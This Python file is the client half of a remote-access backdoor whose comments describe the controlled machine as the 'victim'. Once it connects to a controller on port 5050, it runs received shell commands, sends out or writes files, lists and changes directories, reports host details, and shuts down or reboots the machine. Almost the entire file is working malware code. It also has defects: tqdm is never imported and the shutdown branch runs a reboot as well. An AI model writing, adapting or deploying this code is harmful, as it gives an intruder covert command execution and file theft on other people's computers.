import socket
import subprocess
from platform import system
import os
import sys
from colorama import *

# colors
BLUE = Fore.LIGHTBLUE_EX
RED = Fore.LIGHTRED_EX
GREEN = Fore.LIGHTGREEN_EX
WHITE = Fore.WHITE
YELLOW = Fore.LIGHTYELLOW_EX
RESET = Style.RESET_ALL

# connection
HOST_NAME = socket.gethostname()
HOST = socket.gethostbyname(HOST_NAME)
PORT = 5050

# client socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        client.connect((HOST, PORT))
    except:
        print("NO CONNECTION !")
    else:
        print("CONNECTION !")
        break

files = []

while True:
    path = os.getcwd().split(os.sep)
    command = client.recv(1024).decode()
    
    if command == 'ls':
        
        for obj in os.listdir(os.sep.join(path)):
            if os.path.isfile(obj):
                files.append(f'{WHITE}{obj}{RESET}')
            elif os.path.isdir(obj):
                files.append(f'{BLUE}{obj}{RESET}')

        files = ' '.join(files)

        client.send(files.encode())
        
        files = []
    
    # execute commands remotly
    elif command == 'shell':
        output = subprocess.run(client.recv(1024).decode(), shell=True, capture_output=True, text=True)
        client.send(str(output.stdout).encode())

	# send file
    elif command.startswith('send '):
        filename = command[5:]
        total_size = int(client.recv(16).decode())
    
        with open(filename, 'wb') as f, tqdm(total=total_size, unit='B', unit_scale=True, desc=filename) as progress:
            received = 0
            while received < total_size:
                data = client.recv(min(1024, total_size - received))
                if not data:
                    break
                f.write(data)
                received += len(data)
                progress.update(len(data))
        print(f"{GREEN}[+] File '{filename}' received successfully{RESET}")

    # get file
    elif command.startswith('get '):
        filename = command[4:]
        try:
            total_size = os.path.getsize(filename)
            client.send(f"{total_size:<16}".encode())  # send filesize padded to 16 bytes
            with open(filename, 'rb') as f:
                while (chunk := f.read(1024)):
                    client.send(chunk)
        except FileNotFoundError:
            client.send(b'0'.ljust(16))  # send zero filesize to signal error
    
    # get current work directory (getcwd)
    elif command == 'pwd':
        client.send(os.sep.join(path).encode())
    # shutdown the pc
    elif command == 'shutdown':
        os.system('shutdown now') # for windows [ shutdown \s \t 0 ]
    # reboot the pc
        os.system('reboot')   # for windows [ shutdown \r \t 0 ]
    
    # get victim host
    elif command == 'vhost':
        client.send(str(HOST).encode())

    # get victim host-name
    elif command == 'vhost-name':
        client.send(str(HOST_NAME).encode())

    # change directory
    elif command.startswith('cd '):
        os.chdir(os.sep.join(command.split()[1:]))
    
    elif command == 'platform':
        client.send(f'{YELLOW}Platform : {system()}{RESET}'.encode())
    # exit remote
    elif command == 'exit':
        break
    
client.close()
sys.exit()
